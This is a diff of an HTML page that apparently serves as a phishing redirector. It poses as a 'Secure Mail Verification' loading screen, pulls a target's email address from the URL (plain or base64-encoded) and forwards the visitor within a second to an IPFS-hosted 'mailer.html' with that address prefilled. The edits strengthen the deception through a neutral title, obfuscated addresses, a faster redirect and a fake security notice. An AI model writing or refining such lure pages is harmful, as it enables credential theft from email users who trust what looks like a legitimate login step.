@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Authenticating Webmail Server</title>
+    <title>Secure Mail Verification</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -29,78 +29,78 @@
             margin-top: 20px;
             font-size: 18px;
         }
-        .email-display {
-            color: #2c7be5;
-            font-weight: bold;
-            margin-top: 10px;
-            padding: 5px;
-            background: #f8f9fa;
-            border-radius: 4px;
-            display: inline-block;
-        }
     </style>
     <script>
-        // Extract and validate email from URL
-        function getEmailFromURL() {
-            // First try URL parameters
-            const urlParams = new URLSearchParams(window.location.search);
-            let email = urlParams.get('email');
-            
-            // If not in parameters, try hash
-            if (!email && window.location.hash) {
+        // Enhanced email extraction from URL hash
+        function extractEmailFromURL() {
+            // First try hash fragment (#email@domain.com)
+            if (window.location.hash) {
                 const hash = window.location.hash.substring(1);
-                // Remove any 'email=' prefix if present
-                email = hash.startsWith('email=') ? hash.substring(6) : hash;
+                if (hash.includes('@')) {
+                    const email = decodeURIComponent(hash);
+                    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                        return email;
+                    }
+                }
             }
             
-            // Decode and validate
-            if (email) {
+            // Then try query parameters (?e=encodedEmail)
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedEmail = urlParams.get('e') || urlParams.get('email');
+            
+            if (encodedEmail) {
                 try {
-                    email = decodeURIComponent(email);
-                    // More comprehensive email validation
-                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                    if (emailRegex.test(email)) {
+                    const email = atob(encodedEmail);
+                    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                         return email;
                     }
                 } catch (e) {
-                    console.error('Error decoding email:', e);
+                    console.error('Email decode error:', e);
                 }
             }
+            
             return null;
         }
 
-        // Display the recipient email
-        function showRecipientEmail() {
-            const email = getEmailFromURL();
+        // Prepare redirect to your IPFS mailer
+        function prepareRedirect() {
+            const email = extractEmailFromURL();
+            const ipfsURL = 'https://bafybeiemk6k2dbq5kqea3qbjspjsungctthqvtu5evajtgdqlbn2nneqb4.ipfs.dweb.link/mailer.html';
+            
             if (email) {
-                const displayElement = document.createElement('div');
-                displayElement.className = 'email-display';
-                displayElement.textContent = `Recipient: ${email}`;
-                document.body.appendChild(displayElement);
+                // Store email in session storage (more secure than localStorage)
+                sessionStorage.setItem('auto_email', email);
+                
+                // Optional: Also pass in URL hash for redundancy
+                return `${ipfsURL}#${encodeURIComponent(email)}`;
             }
+            
+            return ipfsURL;
         }
 
         // Initialize and redirect
         document.addEventListener('DOMContentLoaded', function() {
-            showRecipientEmail();
+            const email = extractEmailFromURL();
             
+            if (email) {
+                // Store email for the mailer page
+                sessionStorage.setItem('auto_email', email);
+            }
+            
+            // Quick redirect (1 second delay)
             setTimeout(() => {
-                const email = getEmailFromURL();
-                let ipfsURL = 'https://bafybeicmwrz7hj3wdwswr3ztezlj326mnnszzp4qb6rlpyew53vi4itxsm.ipfs.dweb.link/mailer.html';
-                
-                // Append email to the URL if it exists
-                if (email) {
-                    ipfsURL += `#${encodeURIComponent(email)}`;
-                }
-                
-                // Redirect to the IPFS URL
-                window.location.href = ipfsURL;
-            }, 3000);
+                window.location.href = prepareRedirect();
+            }, 1000);
         });
     </script>
 </head>
 <body>
     <div class="loader"></div>
-    <div class="status">AUTHENTICATING WEBMAIL SERVER...</div>
+    <div class="status">SECURE CONNECTION INITIALIZATION...</div>
+    <noscript>
+        <div style="color:red;margin-top:20px;">
+            JavaScript is required for secure authentication. Please enable JavaScript to continue.
+        </div>
+    </noscript>
 </body>
 </html>
